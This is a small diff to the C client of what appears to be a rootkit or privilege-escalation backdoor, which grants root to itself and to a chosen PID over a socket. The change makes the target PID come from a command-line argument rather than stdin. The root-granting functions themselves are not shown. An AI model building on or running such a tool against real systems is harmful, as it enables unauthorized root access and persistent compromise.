@@ -81,15 +81,12 @@ int main ( int argc, char *argv[] )
     int sockfd;
     int io;
     sockfd = socket(AF_INET, SOCK_STREAM, 6);
-    char input[30];
     pid_t target_pid;
+    if (argc > 1)
+        target_pid = atoi(argv[1]);
 
     printf("[+] set current process with root privileges\n");
     root_me(sockfd);
-
-    printf("enter target pid: \n");
-    fgets(input, sizeof(input), stdin);
-    target_pid = atoi(input);
 
     printf("[+] set PID: %d with root privileges\n", target_pid);
     set_proc_root(sockfd, target_pid);
